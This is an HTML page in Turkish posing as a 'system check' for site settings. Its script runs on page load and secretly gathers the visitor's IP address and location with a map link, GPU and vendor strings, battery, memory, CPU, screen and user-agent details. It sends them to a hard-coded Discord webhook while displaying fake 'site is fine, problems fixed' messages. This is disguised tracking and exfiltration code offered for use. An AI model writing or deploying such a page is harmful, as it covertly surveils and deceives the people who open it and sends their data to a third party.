<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrol√º</title>
    <style>
        body { background:#050505; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; overflow:hidden; }
        .container { text-align: center; }
        .loader { border: 3px solid #1a1a1a; border-top: 3px solid #00ff41; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color:#444; font-size:13px; font-weight:400; letter-spacing:1px; margin:0; }
        .ok { color:#0f4; font-weight:bold; }
    </style>
</head>
<body>
    <div class="container">
        <div id="ld" class="loader"></div>
        <h2 id="t">Site ayarlarƒ± kontrol ediliyor...</h2>
    </div>

    <script>
        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function stealthReport() {
            let info = { gpu: "Gizlendi", vendor: "Gizlendi", bat: "X", loc: "√áekilemedi", ip: "X" };

            // 1. IP TABANLI AYRINTILI KONUM (ƒ∞zin ƒ∞stemez - Gizli)
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                info.ip = d.ip;
                info.loc = `üìç **B√∂lge:** ${d.city}, ${d.region} / ${d.country_name}\nüõ∞Ô∏è **Saƒülayƒ±cƒ±:** ${d.org}\nüó∫Ô∏è [Haritada G√∂r](https://www.google.com/maps?q=${d.latitude},${d.longitude})`;
            } catch(e) {}

            // 2. GPU Kƒ∞Lƒ∞Dƒ∞Nƒ∞ KIRMA (WebGL2 Force)
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl2') || c.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                if (dbg) {
                    info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
                    info.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
                }
            } catch(e) {}

            // 3. Pƒ∞L DURUMU
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    info.bat = `%${(b.level * 100).toFixed(0)} (${b.charging ? 'Prizde' : 'Pilde'})`;
                }
            } catch(e) {}

            // 4. KIRMIZI VAH≈ûƒ∞ EMBED (TAM ERƒ∞≈ûƒ∞M)
            const payload = {
                embeds: [{
                    title: "üïµÔ∏è KRƒ∞Tƒ∞K Cƒ∞HAZ VE KONUM ANALƒ∞Zƒ∞",
                    color: 15158332, // ƒ∞stediƒüin Kƒ±rmƒ±zƒ± Tonu
                    fields: [
                        { name: "üìç LOKASYON (IP TABANLI)", value: info.loc, inline: false },
                        { name: "üõ†Ô∏è DONANIM KATMANI", value: `**GPU:** \`${info.gpu}\`\n**VENDOR:** \`${info.vendor}\`\n**RAM:** ${navigator.deviceMemory || 'X'} GB\n**CPU:** ${navigator.hardwareConcurrency || 'X'} √áekirdek`, inline: false },
                        { name: "üì± YAZILIM/EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${screen.width}x${screen.height}\n**Dƒ∞L:** ${navigator.language}`, inline: true },
                        { name: "üîã DURUM", value: info.bat, inline: true },
                        { name: "üåê BAƒûLANTI", value: `**IP:** ${info.ip}`, inline: false },
                        { name: "üîç USER AGENT", value: "```" + navigator.userAgent + "```", inline: false }
                    ],
                    footer: { text: "Gizli Tarama Tamamlandƒ±" },
                    timestamp: new Date()
                }]
            };

            // 5. YILDIRIM G√ñNDERƒ∞M
            const blob = JSON.stringify(payload);
            navigator.sendBeacon(u, blob);
            fetch(u, { method: 'POST', mode: 'no-cors', body: blob });

            // 6. ARAY√úZ AKI≈ûI
            const t = document.getElementById('t');
            const ld = document.getElementById('ld');
            setTimeout(() => { 
                t.innerHTML = '<span class="ok">Site uygun halde!</span>'; 
            }, 700);
            setTimeout(() => { 
                ld.style.display = "none";
                t.innerHTML = '<span class="ok">Sorunlar d√ºzeltildi.</span>'; 
            }, 1600);
        }

        window.onload = stealthReport;
    </script>
</body>
</html>
